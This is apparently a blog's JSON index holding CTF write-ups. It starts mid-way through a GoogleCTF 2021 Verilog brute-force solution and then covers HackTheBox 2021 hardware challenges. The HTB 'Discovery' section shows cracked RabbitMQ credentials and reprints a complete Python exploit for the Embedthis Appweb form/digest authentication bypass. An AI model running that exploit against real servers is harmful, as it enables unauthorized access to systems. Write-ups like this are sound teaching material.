64 bit input will give us the output of 64 bits of 1\u0026rsquo;s.\nIdea 2: Bruteforce all 64 bits Although technically possible, ModelSim is unfortunately way too slow to bruteforce 64 bits. By the time it finds the solution, we\u0026rsquo;ll all probably be ruled over by giant kittens that shoot lasers out of their eyes, so that\u0026rsquo;s a no go.\nIdea 3: Knowing that the flag is ASCII, bruteforce 56 bits, since we know that every 8th bit is a 0 This certainly reduces the amount of time needed to bruteforce, however, whilst we probably won\u0026rsquo;t be ruled by laser shooting kittens by the time it finishes, it will probably take longer than the average lifespan of a human. I don\u0026rsquo;t know about you, but I\u0026rsquo;d like to be alive before it finishes.\nIdea 4: Bruteforce n bits at a time, where n is a reasonable number of bits that can be bruteforced Now this is more like it. Now we just need to find the sweet spot of a reasonable number. Since each bit of the input affects the output of its neighbouring bits (i.e. changing bit 5 affects the output of bit 6), and it\u0026rsquo;s also \u0026ldquo;cyclic\u0026rdquo; (i.e. bit 0 affects the output of bit 63 and vice versa), we should probably try and figure out just how big its influence is.\nLooking at the Verilog implementation of the digital circuit, we can see that some inputs depend on outj[i-1] or outj[i+1]. Since the output blocks \u0026ldquo;cascade\u0026rdquo; (output of first block flows onto second, which flows onto the third block etc.), we can determine just how many neighbours a change in bit i affects.\n The above shows roughly how a change in a bit affects the neighbours. Blocks 2, 3 and 6 rely on the output of a block on the previous row - e.g. Row 5 block 2 relies on the output of Row 4 block 1. On the other hand, blocks 4 and 5 rely on the output of a block on the next row - e.g. Row 5 block 4 relies on the output of Row 6 block 3. Note how block j on row i only relies on block j-1 (and never block j+1). What all this essentially means is that if we\u0026rsquo;re working from index 0 to index 63, if the output bits from 0 to m are all 1\u0026rsquo;s, then bits 0 to m-3 are all correct.\nIf we\u0026rsquo;re working from index 63 to index 0, and the output bits are all 1\u0026rsquo;s from 63 to n, then that means all bits from 63 until n+2 are correct.\nSo the plan? Bruteforce 8 bits from left to right, and 8 bits from right to left, with some extra bits as a buffer (based on the above revelations). This means we\u0026rsquo;ll be bruteforcing a maximum of 21 (8+8+3+2) bits at a time. ModelSim only takes a few seconds to do bruteforce 21 bits, so we\u0026rsquo;re good to go.\nWriting the testbench `timescale 1ns/1ps module test; reg [63:0] in; wire [63:0] out; parking test(in,out); reg [21:0] i,j,k; reg [7:0] verify; reg [63:0] flag=64\u0026#39;b0; initial begin for (j=0;j\u0026lt;3;j=j+1) begin // brute force first and last few bits  for (i=0;i\u0026lt;2**21;i=i+1) begin in = flag; in[63-(j*8) -:10] = i[20:11]; in[j*8 +: 11] = i[10:0]; #10; // check out bits based on observed patterns  if (out[63-(j*9) -: 7] == 7\u0026#39;b111_1111 \u0026amp;\u0026amp; out[j*8 +: 6] == 6\u0026#39;b111_111) begin // verify that every 8th bit is a 0, because ASCII  for (k=0;k\u0026lt;8;k=k+1) verify[k] = ~(in[(k+1)*8-1]); if (\u0026amp;verify) flag = in; end end end // final 16-ish bits  for (i=0;i\u0026lt;2**16;i=i+1) begin in = flag; in[39:24] = i[15:0]; #10; if (\u0026amp;out) begin flag = in; // Victory display  $display(\u0026#34;After too many hours, the flag has been obtained!!!\\n%b\u0026#34;,flag); end end end endmodule We only need to bruteforce 21 bits at a time 3 times, since that will already give us 48 bits of the flag (we take 16 out of the 21 bits each time). The rest can be done with a smaller range. There are delays (#10;) just in case some changes take a little longer to propagate through the circuit.\n At long last, we get what should hopefully be the bits of the flag. Good news is, that it only took 30 seconds! Now to put them in the correct order, and finally, after all these sleepless days, get the flag.\nflag = b\u0026#34;CTF{\u0026#34; while bits: byte, bits = bits[:8], bits[8:] flag += bytes([ int(byte[::-1], 2) ]) flag += b\u0026#34;}\u0026#34; print(flag) Looking at this specific chunk of the print flag function in game.py gives all the details needed to get the flag from the bits obtained from ModelSim.\n So doing just that (then throwing it around CTF{}), we get our flag!\nFlag: CTF{2TheBr1m}  A sight I wish I saw during the competition period.\n","date":"2021-07-31","description":"GoogleCTF 2021 featured a hardware challenge called \"parking\", which resulted in me undertaking a long and arduous journey to solve it with a software I had never thought I would use in a CTF challenge - ModelSim","permalink":"https://anniequus.com/posts/googlectf-parking/","title":"Inefficiently solving GoogleCTF 2021 with Verilog (ModelSim)"},{"contents":"This will be a writeup of all the hardware challenges in HackTheBoxCTF 2021. Although half the challenges in the category was just figuring out the protocol used, there were some interesting lessons learned.\nThe Basics The first three challenges (which I\u0026rsquo;ll just call the basics) were best for getting used to using Saleae, its analysers, and getting a basic understanding of the protocols. This is where the heavy reliance on Saleae (logic analyser alpha) begins.\nSerial Logs Download the challenge We start off with a simple capture. Two channels, one is always high, and the other has both high and low signals. Based solely on the challenge title, we have serial data coming in, and given that there is no clock, we know we\u0026rsquo;re dealing with asynchronous serial data. Now because we don\u0026rsquo;t have a clock, we need to find the bitrate, which tells us to sample x bits every second.\nSo, the proper way to do this would be to measure the smallest time between a rise and fall of a signal, then calculate the bit rate using that. But the issue was that I wasn\u0026rsquo;t aware of that at the time, and I just blindly guessed bitrates initially (well, blindly with the help of a guide ). But after cycling through those guesses, we get some promising data with bitrate = 115200. Upon exporting the results (and running a quick script to collect just the data we want), we can see that there\u0026rsquo;s a whole bunch of \u0026ldquo;Connection From\u0026rdquo; repeated, until we hit an error. The gibberish must be because of a baud rate change (change of bitrate). So looks like we\u0026rsquo;ll have to calculate the bitrate of the second half. Given that the first half had a bitrate of 115200, and the smallest gap between the rise and fall of a signal is roughly 8.5us, we can approximate the bitrate by doing: 1/0.0000085s (8.5us = 0.0000085s), or more generally 1/gap.\nSo with this we can simply measure the smallest gap in the second half of the capture (~13.5us), throw that into the formula, and get an approximate bitrate (~74000 bits/s). Although it may not be the exact bitrate used, it was accurate enough to work in this case. Exporting the resulting data, and using a simple script to grab all the data:\nimport csv output = \u0026#39;\u0026#39; with open(\u0026#34;secondbaud.csv\u0026#34;) as csv_file: csv_reader = csv.reader(csv_file, delimiter = \u0026#39;,\u0026#39;) for row in csv_reader: output += row[1] print(output) we can get the flag that we need! CHTB{wh47?!_f23qu3ncy_h0pp1n9_1n_4_532141_p2070c01?!!!52}\nCompromised Download the challenge Here we see the challenge description talk about serial and slaves, and not the illegal kind. Masters and slaves in the context of chips is a reference to I2C, which is essentially a type of communication specially designed for two chips to talk with each other.\nKnowing this, we can skip some of the information on how I2C works, and load Saleae\u0026rsquo;s handy I2C analyser and see what outputs we get. All we need to notice is that one of the channels has distinctly clock like features, so we can set that as our SCL. Leaving our other channel as the SDA.\n Looking at our output, we see that a lot of data is being written to 0x34, but some of them are being written to 0x2C. That seems quite suspicious, so let\u0026rsquo;s use a python script to take a look at what\u0026rsquo;s happening there. (Note that the format is in: Time - ID - Address - Data - Read/Write - ACK/NAK)\nimport csv output = \u0026#39;\u0026#39; with open(\u0026#34;idk.txt\u0026#34;) as csv_file: csv_reader = csv.reader(csv_file, delimiter = \u0026#39;,\u0026#39;) for row in csv_reader: # adds data to output if it\u0026#39;s being written to 0x2c if row[2] == \u0026#39;0x2C\u0026#39;: output += row[3][2:] # data I had was in hex, so needed to decode it to ascii byte_array = bytearray.fromhex(output) print(byte_array.decode()) Running the script, we get the flag! CHTB{nu11_732m1n47025_c4n_8234k_4_532141_5y573m!@52)#@%}\nSecure Download the challenge Based on the challenge description mentioning microSD cards, we can guess that the SPI protocol is being used (as both SD and microSD cards use it ).\nUpon opening the capture, we see 4 channels. Channels 0 and 1 seem to be our data in, and Channel 3 is very clearly a clock. Meaning Channel 2 is the enable line, telling us when to sample the data from Channel 0 and 1. Since we have 2 channels that seem to be giving us data, we\u0026rsquo;ll export all that info (as hex bytes), and run it through a simple python script.\nimport csv output = \u0026#39;\u0026#39; with open(\u0026#34;prayers.txt\u0026#34;) as csv_file: csv_reader = csv.reader(csv_file, delimiter = \u0026#39;,\u0026#39;) next(csv_reader) for row in csv_reader: # ignore the massive bunches of 0x00 and 0xFF in Channels 0 and 1 if row[2] != \u0026#34;0xFF\u0026#34; and row[2] != \u0026#34;0x00\u0026#34;: output += row[2][2:] if row[3] != \u0026#39;0xFF\u0026#39; and row[3] != \u0026#34;0x00\u0026#34;: output += row[3][2:] byte_array = bytearray.fromhex(output) # extended characters in output, so must use extended ascii to decode print(byte_array.decode(\u0026#39;ISO-8859-1\u0026#39;)) And just like that, we get our flag! CHTB{5P1_15_c0mm0n_0n_m3m02y_d3v1c35_!@52}\nThe Next Steps The next three were building on using protocols, and included some extra concepts too.\nOff The Grid Download the challenge A super fun challenge, where the important things to do are read the datasheet, and debug your own code.\nFirst important thing to note is the schematic. This provides all the context needed to analyse the .sal capture given.\n The full image can be found in the download file, but the most important things to note are: the model of OLED display and chip, the pins, and which channel they\u0026rsquo;re connected to in the logic analyser.\nFrom the schematic, it states that the screen/chip combo used is the SH1306. Although there\u0026rsquo;s a cheap OLED screen of the same model name on aliexpress , there isn\u0026rsquo;t really a datasheet that explains anything about it. There is however, an OLED + chip with a very similar name, the SSD1306. And even better, it has a very handy datasheet for us to take a look at. Comparing the pins of our schematic and that of the datasheet, they\u0026rsquo;re similar enough for us to use.\nTaking a look at what each pin means and is actually doing, we get the following information:\n DIN: The actual data CLK: The clock CS: Chip select (active low) D/C: Data/Command, low = transfer DIN data to command register, high = write to GDDRAM (to be displayed) RES: Reset  Great, since we know that data is being written to the display (GDDRAM) we could probably try to find a way to emulate the screen, but how can we do that? Let\u0026rsquo;s keep reading the datasheet.\n Based on this bit of the datasheet, we can deduce that the data transfer that has been captured is using 4-wire SPI. We know this because we have SDIN, (S)CLK, CS, D/C and RES. The Tie LOW and NC just means we can ignore those pins/signals.\nSweet, now that we know what protocol is being used, we just need to figure out how to deal with the data being sent to GDDRAM. For now, we can ignore the commands (when D/C is low), since there are a lot of them in the datasheet, and at this stage there is no easy way to decode each command.\nCasually reading the datasheet, we hit the jackpot, some info on how the GDDRAM actually works. The key information we can take away here, is the fact that whatever is in GDDRAM is bitmapped. What this means is that a single bit represents a pixel on the screen. This means we won\u0026rsquo;t need to do anything too fancy to display what is going on in the screen. A simple python script (and GIMP) is all we need.\nBut now we need to know how exactly the bits are arranged to get the bitmap that we want.\nFirst of all, the bits are read as groups of 8 (byte by byte). They are then arranged into a page as shown: Each page has 128 of these bytes, all along a row, from left to right:\nAnd each page is stacked on top of each other, which will then give us our final image: Bearing in mind that the dimensions of the OLED screen are 128x64, meaning we will have 8 pages per screen.\nNow that we know how the OLED screen will work, it\u0026rsquo;s time to extract the data from the Saleae capture, and get our flag.\nAs we know that the transfer protocol used was SPI, we can simply let a Saleae analyser give the required bits for us. We set the MOSI (or MISO, makes no difference in this case) as the data we want to get (Channel 0), our good old clock (Channel 1), and the enable line (Channel 3) which tells us when to sample our DIN. We set the enable line to active high, since when Channel 3 (D/C) is high, that\u0026rsquo;s when data is being written into GDDRAM. Taking a look at how the data is transferred, we can see that there are 6 distinct \u0026ldquo;pulses\u0026rdquo; of data, indicating the number of different displays. And within those pulses, there are 8 distinct blocks of data being sent to the GDDRAM, showing how data is sent page by page. This gives us a good idea on how to write a simple script to turn all our bits to a bitmappable image. Although it\u0026rsquo;s possible to use PIL to convert our bits straight to a bmp file, I like to export the bytes as .data, then open it up in GIMP to get the full picture. After some debugging , we finally have a successful script.\nimport csv from Crypto.Util.number import long_to_bytes PAGE_SIZE = 128 BYTE_TO_BIT = 8 SCREEN_SIZE = PAGE_SIZE * 64 # 128x64 bit screen screens = [\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;] output = \u0026#39;\u0026#39; bit_count = 0 screen_index = 0 with open(\u0026#39;bits_out.txt\u0026#39;) as csv_file: csv_reader = csv.reader(csv_file, delimiter=\u0026#39;,\u0026#39;) # ignore header next(csv_reader) for row in csv_reader: # Format is timstamp - ID - DIN din = row[2] # reformat to make binary look nicer and easier to work with din = \u0026#39;\u0026#39;.join(din.split())[2:] output += din bit_count += 8 # convert output to page format then clear output if bit_count % SCREEN_SIZE == 0 and output: # split into pages for i in range(8): page = output[i * PAGE_SIZE * BYTE_TO_BIT: (i+1) * PAGE_SIZE * BYTE_TO_BIT] # d7 in index 7, d6 in index 6 etc. for j in range(8): screens[screen_index] += page[7-j::8] output = \u0026#39;\u0026#39; screen_index += 1 # write each screen as bits to a file file = open(\u0026#34;screendata.data\u0026#34;, \u0026#39;wb\u0026#39;) for screen in screens: file.write(long_to_bytes(int(screen,2))) file.close() Now open our final image through GIMP, and we have our flag! CHTB{013d_h4ck1n9_f7w!2^25#}\nHidden Download the challenge This challenge added a nice touch of rev and some bits of guessing. Most of that knowledge courtesy of genius teammate .\nLet\u0026rsquo;s look at the firmware first. Opening the .ELF file in Ghidra gives us a good idea as to what\u0026rsquo;s happening.\n We have some sort of XOR encryption going on\n Building on that, there\u0026rsquo;s a pseudo-random key generator, using LCG algorithm . We get that our seed is 0x2e9d3(from next_in_seq), the multiplier is 0x303577d, the increment is 0x145a, and the modulus is 0xff.  Prior to being written, there\u0026rsquo;s a small little operation done to the encoded data.   Putting it all together, we can figure out what\u0026rsquo;s happening to the flag: Each byte of the flag (0x32, meaning a total of 50 bytes) is XOR\u0026rsquo;d with a different value determined by the pseudo-random key generator. Then, before it\u0026rsquo;s written to the output file, the value is split into two, with the first half containing the first 4 MSB of the byte, plus 1, and the second half containing the next (and last) 4, also plus 1.\nNow we can begin the bit extraction.\nOpening up the .sal file on our favourite logic analyser, all signs seemed to indicate that the data was being delivered using async serial (no clock, each gap between a fall and the next rise was a multiple of roughly the same time). However, attempts at getting the logic analyser to play nice didn\u0026rsquo;t seem to work, with hundreds upon hundreds of (framing) errors being thrown at my face. This meant we\u0026rsquo;d have to extract all the bits ourselves. Luckily this isn\u0026rsquo;t too difficult.\nWhen exporting the data as a CSV (using Saleae\u0026rsquo;s default exporter), we can see that we\u0026rsquo;re told when the signal changes, and what it\u0026rsquo;s changed to (in channel 0, where the important data lies). Noting the approximate time a single bit is represented (in this case, approximately 17us), which can be seen by looking at the smallest gap between a rise and fall of a signal (or fall and rise). Longer signal lengths should be a multiple of this. import csv # arbitrary number to skip the initial/end high signals MAX_GAP = 200 with open(\u0026#39;digital.csv\u0026#39;) as csv_file: csv_reader = csv.reader(csv_file, delimiter = \u0026#39;,\u0026#39;) last_time = 0 last_bit = \u0026#39;0\u0026#39; # skip headers next(csv_reader) output = \u0026#39;\u0026#39; for time,data,dud in csv_reader: time = float(time) # get gap in us gap = (float(time) - last_time) * (10**6) # use gap between previous and current time to get # of bits # every ~17us time gap is 1 bit, assume max gap is 200us if gap \u0026lt; MAX_GAP: bits = gap // 17 output += int(bits) * last_bit last_time = time last_bit = data print(output) Now based on the firmware, we\u0026rsquo;re expecting there to be about (50 * (8+2)) = 500 bits (50 bytes of the flag * (8 bits per byte + 2 from the two extra +1\u0026rsquo;s before the encoded data was outputted)). Instead, we\u0026rsquo;re greeted with 3598 bits\u0026hellip; strange. This is where some of the guessing begins.\nGiven that there wasn\u0026rsquo;t a clock, nor an obvious enable signal to indicate when the transmission starts/ends, it\u0026rsquo;s possible that the bits we had received also start/end with some number of 1\u0026rsquo;s, since the signal started and ended with very long high signals.\n011010111000000011000000011000000011010100011000000011000000011000000011001000111000000011000000011000000011011010111000000011000000011000000011\nLooking at this small selection of the bitstream, it\u0026rsquo;s very clearly there\u0026rsquo;s some sort of pattern going on, namely the repeat of 000000011 three times, surrounding some bits of random 1\u0026rsquo;s and 0\u0026rsquo;s.\nBased on this, we can break the stream into sections of 9. Given that 3598 isn\u0026rsquo;t divisible by 9, we can deduce that there are 2 1\u0026rsquo;s at either the start or the end of the bitstream. Initially, we tried to put two 1\u0026rsquo;s at the end of the bitstream, however, that resulted in groups of binaries that made little sense. When we tried to put two 1\u0026rsquo;s at the start of the bitstream, things made a bit more sense. Upon doing so, everything started with a 110. Given that there were lots of 110000000 (now that the two 1\u0026rsquo;s were added at the start, the repeated groups weren\u0026rsquo;t 000000011 anymore), we can safely ignore these.\nWith the bits all extracted and thoroughly examined, all we have left to do now, is reverse what\u0026rsquo;s happening in the firmware in our code, and hopefully get our flag. However, we got errors telling us the bytes were larger than 256. As it turns out, endianness was at play here, and reversing each byte managed to solve the issue.\nfrom pwn import xor from ctypes import c_uint GROUP_SIZE = 9 bits = open(\u0026#39;bits.txt\u0026#39;).read() bits = \u0026#39;11\u0026#39; + bits bits_list = [] # split bits into groups of 9 then add to list for i in range(1,len(bits)//GROUP_SIZE): group = bits[(i-1)*GROUP_SIZE:i*GROUP_SIZE] # ignore the repeated groups of 110000000 if group != \u0026#39;110000000\u0026#39;: bits_list.append(group) # The LCG algorithm used to generate the XOR keys def lcg(): seed = c_uint(0x2e9d3) while 1: seed = c_uint(seed.value * 0x303577d + 0x145a) yield seed.value % 0xff ciphertext = bytearray() # Reversing what\u0026#39;s being done in the firmware for i in range(0, len(bits_list), 2): c1, c2 = int(bits_list[i][1:6], 2) , int(bits_list[i+1][1:6], 2) x1, x2 = c1-1, c2-1 b = (x1 \u0026lt;\u0026lt; 4) + x2 ciphertext.append(b) # The XOR and flag L = lcg() xor_key = bytearray([next(L) for _ in ciphertext]) plaintext = xor(xor_key, ciphertext) print(plaintext.decode()) And just like that, we get our flag! CHTB{10w_13v31_f12mw4235_741ks_70_h42dw423_!@3418}\nDiscovery This challenge was certainly challenging. I never got to solve it during the competition period, however, upon looking at solutions, this one is a very fun one to explore (fun is not guaranteed).\nUnlike the other hardware challenges, this not only didn\u0026rsquo;t involve Saleae, but also had not just one, but two docker instances we could connect to. The URL and port is different for everyone, but what lies beyond is the same. We are given to IPs:\n One is an AppWeb panel (and asks us for a username or password) The other is an AMQP server (although we can\u0026rsquo;t connect through a web browser, the response headers tell us that it\u0026rsquo;s using the AMQP protocol)  Despite a lot of begging and pleading, there didn\u0026rsquo;t seem to be any way past the authentication on the AppWeb panel.\nAs it turns out, the entirety of the authentication can by bypassed given that we know the username. A step by step walkthrough of how it works can be found here and the exploit script with a basic description behind the CVE can be seen here . But to summarise the issue, whilst the username and password is checked when the authentication type is set to \u0026ldquo;basic\u0026rdquo;, if the http headers being sent to the server had the authentication type changed to either \u0026ldquo;digest\u0026rdquo; or \u0026ldquo;form\u0026rdquo;, only the username is checked. Using this exploit (with the help of an exploit script ) and guessing that the username was \u0026ldquo;admin\u0026rdquo; (because why wouldn\u0026rsquo;t you have that as the username), we finally get access to the AppWeb panel.\nNow, we\u0026rsquo;re greeted with a few things of note. Within the RabbitMQ access table, there are 2 entries:\n anthony_davis (with password hash 89D9743B793B22AEB9A8142ABD59FDF4CDABFDD01796C31BE7587C114E0D37C1) leo (with password hash 27BE4E31517E61D2BEF777B7293B7D8C73C14BD1B8F2839A7B8226CBEFF30E99)  Throwing both of these password hashes into crackstation, we get a hit with anthony_davis' hash (password = winniethepooh).\nOn top of the password hashes, we\u0026rsquo;re told that leo will be exchanging messages using the \u0026ldquo;topic\u0026rdquo; exchange type. This will be very important information shortly.\nNow armed with RabbitMQ credentials, let\u0026rsquo;s get started with AMQP. AMQP (Advanced Message Queuing Protocol) is a messaging protocol, that allows for sending and receiving of messages with the use of queues. RabbitMQ is just an (open source) implementation of the protocol. Here is a great tutorial going over RabbitMQ. But for now we only need to know a few things:\n RabbitMQ acts as a \u0026ldquo;broker\u0026rdquo;, something that takes the message from a sender, and gives it to the receiver via a queue. Because the exchange type is topic, we (the receiver) can only retrieve messages of a certain topic.  Here is the code I used, with some description of what is happening:\nimport pika # Connect to AMQP amqp_IP = # IP address of the AMQP server parameter = pika.URLParameters(f\u0026#39;amqp://anthony_davis:winniethepooh@{amqp_IP}/%2f\u0026#39;) connection = pika.BlockingConnection(parameter) # Open channel and declares type of exchange (based on info on web portal) channel = connection.channel() channel.exchange_declare(exchange=\u0026#34;Base\u0026#34;, exchange_type=\u0026#34;topic\u0026#34;) # Creates a queue, and name is auto generated by RabbitMQ (empty string tells the broker to do the naming for us) result = channel.queue_declare(queue=\u0026#39;\u0026#39;) queue_name = result.method.queue # bind queue to exchange - essentially tells RabbitMQ where to send the messages to # the \u0026#39;#\u0026#39; acts as a wild card (match 0 or more words), unlike \u0026#39;*\u0026#39; (which is just match 1 word) channel.queue_bind(exchange = \u0026#34;Base\u0026#34;, queue = queue_name, routing_key=\u0026#39;#\u0026#39;) # what to do when messages are received - just print the body of the messages def callback(ch, method, properties, body): print(f\u0026#34;\u0026gt;\u0026gt; {body}\u0026#34;) # start the message receiving channel.basic_consume(queue = queue_name, on_message_callback=callback, auto_ack = True) channel.start_consuming() Running the script, we get some outputs, and finally, the flag! CHTB{1_h4v3_n0_n4m3_@_@}\nExtras There\u0026rsquo;s an imposter among us Whilst debugging some issues with the bit mapping in Off The Grid , I encountered something very suspicious\u0026hellip; Python 3-ified exploit script to bypass authentication import requests import argparse print (\u0026#34;\u0026#34;\u0026#34;---------------------------------------------------------------- Embedthis Appweb/Http Zero-Day Form/Digest Authentication Bypass ---------------------------------------------------------------- \u0026#34;\u0026#34;\u0026#34;) def test_digest(r): auth = [\u0026#34;realm\u0026#34;, \u0026#34;domain\u0026#34;, \u0026#34;qop\u0026#34;, \u0026#34;nonce\u0026#34;, \u0026#34;opaque\u0026#34;, \u0026#34;algorithm\u0026#34;, \u0026#34;stale\u0026#34;, \u0026#34;MD5\u0026#34;, \u0026#34;FALSE\u0026#34;, \u0026#34;Digest\u0026#34;] wwwauthenticate = r.headers.get(\u0026#39;WWW-Authenticate\u0026#39;) if wwwauthenticate is None: return False for k in auth: if k not in wwwauthenticate: return False return True def test_form(r): \u0026#34;\u0026#34;\u0026#34; extremely shoddy recognition, expect false positives \u0026#34;\u0026#34;\u0026#34; auth = [(\u0026#34;X-XSS-Protection\u0026#34;, \u0026#34;1; mode=block\u0026#34;), (\u0026#34;X-Content-Type-Options\u0026#34;, \u0026#34;nosniff\u0026#34;), (\u0026#34;ETag\u0026#34;, None), (\u0026#34;Date\u0026#34;, None)] potential_auth = [(\u0026#34;Last Modified\u0026#34;, \u0026#34;\u0026#34;), (\u0026#34;X-Frame-Options\u0026#34;, \u0026#34;SAMEORIGIN\u0026#34;), (\u0026#34;Accept-Ranges\u0026#34;, \u0026#34;bytes\u0026#34;), (\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;)] if r.headers.get(\u0026#34;WWW-Authenticate\u0026#34;) is not None: return False for k, v in auth: rv = r.headers.get(k) if not rv: return False if v is not None and v != rv: return False potential_count = 0 for k, v in potential_auth: rv = r.headers.get(k) if rv and v != \u0026#34;\u0026#34; and v == rv: potential_count += 1 print(\u0026#34;[+] Optional matchings: {}/{}\u0026#34;.format(potential_count, len(potential_auth))) return True def test(url): \u0026#34;\u0026#34;\u0026#34; Newer EmbedThis HTTP Library/Appweb versions do not advertise their presence in headers, sometimes might be proxied by nginx/apache, we can only look for a default headers configuration \u0026#34;\u0026#34;\u0026#34; r = requests.get(url) # EmbedThis GoAhead uses a similar headers configuration, let\u0026#39;s skip it explicitly serv = r.headers.get(\u0026#34;Server\u0026#34;) if serv and \u0026#34;GoAhead\u0026#34; in serv: return False if test_digest(r): return \u0026#34;digest\u0026#34; elif test_form(r): return \u0026#34;form\u0026#34; return None def exploit(url, username=\u0026#34;joshua\u0026#34;, authtype=\u0026#34;digest\u0026#34;): payload = { \u0026#34;username\u0026#34;: username } headers = { \u0026#34;authorization\u0026#34;: \u0026#34;Digest username={}\u0026#34;.format(username), \u0026#34;user-agent\u0026#34;: \u0026#34;TruelBot\u0026#34;, \u0026#34;content-type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, } if authtype == \u0026#34;digest\u0026#34;: r = requests.get(url, data=payload, headers=headers) else: r = requests.post(url, data=payload, headers=headers) print(r.content) if r.status_code != 200 or len(r.cookies) \u0026lt; 1: print(\u0026#34;[!] Exploit failed, HTTP status code {}\u0026#34;.format(r.status_code)) return print(\u0026#34;[*] Succesfully exploited, here\u0026#39;s your c00kie:\\n{}\u0026#34;.format(dict(r.cookies)) ) if __name__ == \u0026#34;__main__\u0026#34;: parser = argparse.ArgumentParser(description=\u0026#34;Test\u0026amp;Exploit EmbedThis form/digest authentication bypass (CVE-XXXX-YYYY)\u0026#34;) parser.add_argument(\u0026#39;-t\u0026#39;, \u0026#39;--target\u0026#39;, required=True, help=\u0026#34;specify the target url (i.e., http(s)://target-url[:port]/)\u0026#34;) parser.add_argument(\u0026#39;-u\u0026#39;, \u0026#39;--user\u0026#39;, required=True, help=\u0026#34;you need to know a valid user name\u0026#34;) parser.add_argument(\u0026#39;-c\u0026#39;, \u0026#39;--check\u0026#39;, action=\u0026#39;store_true\u0026#39;, default=False, help=\u0026#34;test for exploitability without running the actual exploit\u0026#34;) parser.add_argument(\u0026#39;-f\u0026#39;, \u0026#39;--force\u0026#39;, action=\u0026#39;store_true\u0026#39;, default=False, help=\u0026#34;skip exploitability test\u0026#34;) args = parser.parse_args() url = args.target username = args.user t = \u0026#34;form\u0026#34; # default will try form/post if args.check or not args.force: t = test(url) if t is None: print(\u0026#34;[!] Target does not appear to be Appweb/Embedthis HTTP with form/post auth (force with -f)\u0026#34;) else: print(\u0026#34;[+] Potential appweb/embedthis http, {}method\u0026#34;.format(t)) if not args.check: print(\u0026#34;[!] Exploiting {}, user {}!\u0026#34;.format(url, username)) exploit(url, username, t) ","date":"2021-04-26","description":"A collection of writeups for all the hardware challenges in HackTheBoxCTF 2021","permalink":"https://anniequus.com/posts/htb-hardware-writeups/","title":"How HackTheBoxCTF Exposed The Marriage of Saleae And Hardware"},{"contents":"A fun song for a fun band. Sex Baby\u0026rsquo;s cover of \u0026ldquo;The Writhing South\u0026rdquo; by Say Anything is out for the public to feast on! A band consisting of a rotation between some mates and I, it was my turn to rock out on the bass for this one.\nThe bass guitar boosted (because bass is cool) not final mix: If you see this (without inspecting source), audio tags don't seem to work on your browser mate.  The final mix (on bandcamp) The Writhing South by Sex Baby The full line up can be seen on the bandcamp page of the track itself.\n","date":"2021-04-16","description":"A quick showcase of a fun cover band with friends where I was on the bass covering The Writhing South by Say Anything","permalink":"https://anniequus.com/posts/tws-bass/","title":"The Writhing South Bass Cover"}]